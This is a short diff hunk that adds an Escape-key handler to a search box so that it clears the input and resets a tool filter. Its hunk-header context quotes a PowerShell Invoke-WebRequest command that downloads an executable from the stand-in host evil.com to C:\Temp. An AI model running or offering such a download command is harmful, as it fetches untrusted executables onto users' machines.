@@ -462,6 +462,15 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         filterTools(e.target.value);
     });
 
+    searchInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            e.preventDefault();
+            searchInput.value = '';
+            filterTools('');
+            searchInput.focus();
+        }
+    });
+
     clearBtn.addEventListener('click', () => {
         searchInput.value = '';
         filterTools('');
